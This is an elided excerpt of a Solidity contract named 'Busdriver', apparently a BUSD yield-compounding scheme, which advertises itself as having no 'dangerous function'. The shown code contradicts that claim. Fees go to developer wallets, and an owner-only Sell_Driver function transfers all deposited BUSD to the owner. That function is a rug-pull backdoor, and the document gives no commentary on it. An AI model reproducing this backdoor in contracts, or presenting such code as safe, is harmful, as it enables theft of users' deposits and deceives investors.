...
An innovative way to grow your BUSD without dangerous function
...
contract Busdriver {
    ...
    constructor(address _dev1, address _dev2, address _mkt, address _dev3) {
		require(!isContract(_dev1) && !isContract(_dev2) && !isContract(_dev3)  && !isContract(_mkt));
        owner = msg.sender;
        dev1 = _dev1;
        dev2 = _dev2;
        dev3 = _dev3;
    ...
    function payFees(uint256 eggValue) internal returns(uint256){
        ...
        token_BUSD.transfer(dev1, tax *2);
        token_BUSD.transfer(dev2, tax *2);
    ...
    function BONUS_COMPOUND_STEP(uint256 value) external {
      ...
      function Sell_Driver() external { 
        require(msg.sender == owner, "Admin use only.");
        token_BUSD.transfer(msg.sender, totalDeposits);
    }
